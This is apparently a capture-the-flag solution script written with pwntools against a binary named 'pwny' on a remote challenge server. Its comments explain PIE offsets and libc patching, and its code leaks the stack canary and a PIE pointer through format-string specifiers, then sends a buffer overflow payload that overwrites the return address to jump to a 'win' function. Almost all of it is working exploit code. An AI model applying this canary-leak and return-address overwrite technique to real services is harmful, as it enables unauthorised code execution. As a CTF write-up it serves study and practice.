import colorama

from pwn import*
from colorama import*

'''

GDB stuff:
    x/gx HEX or HEX expression

PIE:
    binary -> heap -> wilderness -> stack <- other stuff
    ^^ where we want to leak memory address (we need to get offset, so we need to get pointer from 
            binary memory region for calculations.)
    The base address of the binary is changed at runtime everytime but the offset remains the same
    The address starts with 0x5 and the calculated PIE offset ends with 0 and starts with 0x5 as well
    Here, we get the static main address  then subtract that with the %27$p (main address with PIE enabled),
        when we subtract these we get the offset which remains the same for all variables in the binary.
    Another solution:
        We could've (in GDB + PwnDbg) run Piebase to get the base of the binary (or just ran VMMap)
        and leaked a pointer in the binary memory region (%6$p also works) and subtracted these to get
        the offset for OUR local instance. However, the last three nibbles always stay the same
        it's just the first number we have to bruteforce w/ 16 combinations to get the right offset.

        Ex:
        BASE-6th pointer leak (starts with 0x5) = 0x2F00
            pie_offset = 0x{BRUTE_FORCE}F00
        This is because even w/ ASLR on the system it does not mess w/ PIE's offset of the last 3 nibbles, they 
        always stay the same.


Because we have PIE and it's memory-specific we need to ensure our LIBCs match (one locally and the one remotely)"
    [*] - To check your LIBC Version of binary:
    ldd /bin/bash
    strings PATH_TO_LIBC | grep "GNU"
    

OPTIONAL (mandatory if testing locally then remotely), if your OS does not have the same LibC as the target
    you could just patch the binary to use theirs, however, this is still finicky and it's best to just use 
    the debian OS (in this case with same LibC):
        ================================================================================================
        creds: knittinggirl:

        1) Take this https://github.com/knittingirl/CTF-Writeups/blob/main/ELF_Interpreters_and_Libcs/libc-2.39.so
        2) And this https://github.com/knittingirl/CTF-Writeups/blob/main/ELF_Interpreters_and_Libcs/ld-2.39.so

        patchelf pwny --set-interpreter ld-2.39.so --set-rpath ./
        patchelf pwny --replace-needed libc.so.6 libc-2.39.so
        chmod +x ld-2.39.so
        chmod +x libc-2.39.so
        ================================================================================================


* Instead of: binary.sym['main']
    we could've just ran objdump -d pwny | grep win on ANY OS (on Mac I did)
    and gotten the right static address in case you want cleaner code, this has to be 
    done locally in some way however due to finding PIE offset, or needing to figure out what 
    pointer points to what function in the binary region (for method 1):

* Now we are using the same libC and LD as the source machine, this is useful bcs if we locally test and try to 
    leak a PIE pointer from the general memory region of the binary it does not work (match up with solution's).
    For example, %6$p on kali does not start with the 555 but on the remote it does.
'''


colorama.init(autoreset=True)

SERVER_IP = "kubenode.mctf.io"
SERVER_PORT = "30012"

def find_pos_for_canary():
    for i in range(1, 50):
        proc = remote(SERVER_IP, SERVER_PORT)
        payload = f"%{i}$p".encode()
        proc.sendline(payload)
        address = proc.recvuntil(", that's beautiful!").decode()#.split(", that")[0].split()[1]
        address = address.split('name: ')[1].split(', ')[0]
        
        if  address[-3:] == '0x7' or address[-2:] != '00':
            print(f"{Fore.YELLOW}[ Address \'{address}\' in memory position \'{i}\' is NOT the stack canary! ]")
        else:
            print(f"{Fore.GREEN}[ Address \'{address}\' at position \'{i}\' is the stack CANARY!]")
            return i


# canary_mem_pos = find_pos_for_canary()
canary_mem_pos = 19

# procc = process('./pwny', env={"LD_PRELOAD":"./libc.so.2"})
conn = remote(SERVER_IP, SERVER_PORT)
time.sleep(0.5)
conn.recv()




# PIE pointer leak ALWAYS 
# we know this from manually trying, in GDB we see %6$p --> 555... so it's in the binary memory region
# this is the PIE pointer to the MAIN function (could've also done _start, just needs to be in binary memory region)
pie_pointer_leak = 27

payload = f"%{canary_mem_pos}$p--%{pie_pointer_leak}$p".encode()
conn.sendline(payload)

# 55 8d 8e 27 80 f0

# 55 55 55 55 40 00

stack_canary = conn.recv(18)
print(f"{Fore.YELLOW}[*] - STACK Canary Leak: {stack_canary}")
# 0x 3f xx xx xx xx xx xx 00 <- null byte
leaks_output = conn.recv(16).decode()[2:].encode()
print(f"{Fore.YELLOW}[*] - PIE Leak: {leaks_output}")
# 0x 55 xx xx xx xx xx <- 6 bytes

# convert to decimal from hex (base 16)

if b"0x5" not in leaks_output:
    print(f"{Fore.RED}[ PIE leak does not seem to be valid. ]")

stack_canary = int(stack_canary, 16)
pie_leak = int(leaks_output, 16)



# now we need to calculate the binary BASE and use that + some sort of offset to then send the WIN function address
# to overwrite the return address
# NOTE: can also get these without needing to patch by simply running:  objdump -d pwny | grep win and then one for main
binary = context.binary = ELF("pwny")
# Main sym: 4958
# win: 4537 


pie_offset = pie_leak - binary.sym['main']


print(f"{Fore.YELLOW}[*] - PIE Offset Calculated: {hex(pie_offset)}")
if f"{hex(pie_offset)}"[-1] != '0':
    print(f"{Fore.RED}[ Pie offset does not seem to be valid! ]")

win_addr = pie_offset + binary.sym['win']
print(f"{Fore.YELLOW}[*] - Real win address with PIE enabled: {hex(win_addr)}")

# payload = b"A"*72 + p64(stack_canary) + b"B"*8 + p64(win_addr)
payload = b"A"*72 + p64(stack_canary) + b"B"*8 + p64(win_addr)
print(f"{Fore.RED}[ Sending Payload ]: \'{payload}\'")



conn.recv()
conn.sendline(payload)

conn.interactive()
